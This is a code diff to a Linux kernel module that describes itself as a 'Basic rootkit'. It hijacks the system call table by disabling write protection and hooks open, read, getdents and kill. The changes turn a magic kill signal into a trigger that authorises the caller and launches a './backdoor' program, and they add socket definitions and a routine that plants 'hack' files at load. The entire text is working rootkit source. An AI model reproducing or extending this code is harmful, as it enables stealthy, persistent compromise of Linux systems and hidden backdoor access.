@@ -4,6 +4,8 @@
 #include <linux/fs.h>
 #include <linux/syscalls.h>
 #include <linux/utsname.h>
+#include <linux/socket.h>
+//~ #include <arpa/inet.h>
 #include <asm/current.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
@@ -19,9 +21,11 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define FILE_PATH_SIZE      9
 #define FILE_BASENAME       "hack"
 #define FILE_BASENAME_SIZE  4
-#define MAGIC_KILL_PID		1234
+#define MAGIC_AUTH_PID		1234
+#define MAGIC_OPEN_SOCK		4321
 #define MAX_PIDS			8
 #define MIN(a,b)			((a < b) ? a : b)
+#define TCP_ADDR			"127.0.0.1"
 #define TCP_PORT			1122
 #define TCP_PORT_HEX		"00000000:0462"
 
@@ -53,12 +57,20 @@ unsigned long * sys_call = NULL;
 
 // Original functions
 asmlinkage int (*original_sys_open) (const char *pathname, int flags);
+asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_sys_write) (int fd, const void *buf, size_t count);
 asmlinkage int (*original_sys_close) (unsigned int fd);
 asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);
 asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
 asmlinkage pid_t (*original_sys_getpid) (void);
 asmlinkage pid_t (*original_sys_getppid) (void);
-asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count); 
+asmlinkage int (*original_sys_execve) (const char *filename, char *const argv[], char *const envp[]);
+asmlinkage pid_t (*original_sys_fork) (void);
+
+struct file *file_open(const char *path, int flags, int rights);
+int file_close(struct file *file);
+int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
+int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
 
 
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
@@ -155,6 +167,34 @@ static int get_vip_index(const char * filename)
 	}
 	return -1;
 }
+
+/*
+ * Create basic test file for us
+ */
+static int create_hack_file(void)
+{
+#define MAX_NAME_SIZE	64
+    int 	cnt						= 0;
+    char 	filename[MAX_NAME_SIZE] = {'\0'};
+    struct 	file * filp 			= NULL;
+
+	do
+	{
+		snprintf(filename, MAX_NAME_SIZE, "%s%d.txt", FILE_PATH, cnt);
+		filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
+		if(filp)
+		{
+			printk("[%s] File : %s created!\n", __this_module.name, filename);
+			file_write(filp, 0, filename, strlen(filename));
+			file_close(filp);
+			filp = NULL;
+		}
+		cnt++;
+	} while(cnt < 10);
+
+	return 0;
+}
+
 
 struct file *file_open(const char *path, int flags, int rights)
 {
@@ -286,7 +326,6 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 
 	// Zero padding at the end of the buffer
 	memset(tmp + offset, '\0', count - offset);
-	printk("[%s][%s] final line %s\n", __this_module.name, vip_filenames[i].name, tmp);
 	memcpy(buf, tmp, count);
 	kfree(tmp);
 
@@ -295,41 +334,28 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 	return ret;
 }
 
-asmlinkage int fake_sys_close(unsigned int fd)
-{
-#define MAX_NAME_SIZE	64
-    static char cnt;
-    char filename[MAX_NAME_SIZE] = {'\0'};
-    struct file * filp = NULL;
-
-    if(cnt > 9)
-		return original_sys_close(fd);
-
-	snprintf(filename, MAX_NAME_SIZE, "%s%d.txt", FILE_PATH, cnt);
-
-    filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
-    if(filp)
-    {
-        printk("[%s] File : %s created!\n", __this_module.name, filename);
-        file_write(filp, 0, filename, strlen(filename));
-        file_close(filp);
-        filp = NULL;
-    }
-    cnt++;
-
-    return original_sys_close(fd);
-}
-
 asmlinkage int fake_sys_kill(pid_t pid, int sig)
 {
-	int ret = 0;
-	if(pid == MAGIC_KILL_PID)
+	int 			ret		= 0;
+	pid_t 			child;
+	char * const 	argv[] 	= {"./backdoor"};
+
+	switch(pid)
 	{
-		if(authorized_pids_cnt < MAX_PIDS)
-			authorized_pids[authorized_pids_cnt++] = current->pid;
+		case MAGIC_AUTH_PID:
+			printk("[%s] Received auth key...", __this_module.name);
+			if(authorized_pids_cnt < MAX_PIDS)
+				authorized_pids[authorized_pids_cnt++] = current->pid;
+
+			printk("[%s] Start process backdoor", __this_module.name);
+			ret = original_sys_execve("./backdoor", argv, NULL);
+			printk("[%s] Finish process backdoor", __this_module.name);
+
+		break;
+		default:
+			ret = original_sys_kill(pid, sig);
 	}
-	else
-		ret = original_sys_kill(pid, sig);
+
 	return ret;
 }
 
@@ -429,17 +455,21 @@ static int __init lkm_init(void)
 	else
 		printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);
 
+	create_hack_file();
+
     original_sys_open      	= sys_call[__NR_open];
     original_sys_read      	= sys_call[__NR_read];
+    original_sys_write     	= sys_call[__NR_write];
     original_sys_close      = sys_call[__NR_close];
     original_sys_getdents   = sys_call[__NR_getdents];
     original_sys_kill   	= sys_call[__NR_kill];
     original_sys_getpid   	= sys_call[__NR_getpid];
     original_sys_getppid   	= sys_call[__NR_getppid];
+    original_sys_execve   	= sys_call[__NR_execve];
+    original_sys_fork   	= sys_call[__NR_fork];
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open]    	= fake_sys_open;
     sys_call[__NR_read]    	= fake_sys_read;
-    sys_call[__NR_close]    = fake_sys_close;
     sys_call[__NR_getdents] = fake_sys_getdents;
     sys_call[__NR_kill] 	= fake_sys_kill;
     write_cr0(read_cr0() | (0x10000));
@@ -452,7 +482,6 @@ static void __exit lkm_exit(void)
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open] 	= original_sys_open;
     sys_call[__NR_read] 	= original_sys_read;
-    sys_call[__NR_close] 	= original_sys_close;
     sys_call[__NR_getdents] = original_sys_getdents;
     sys_call[__NR_kill] 	= original_sys_kill;
     write_cr0(read_cr0() | (0x10000));
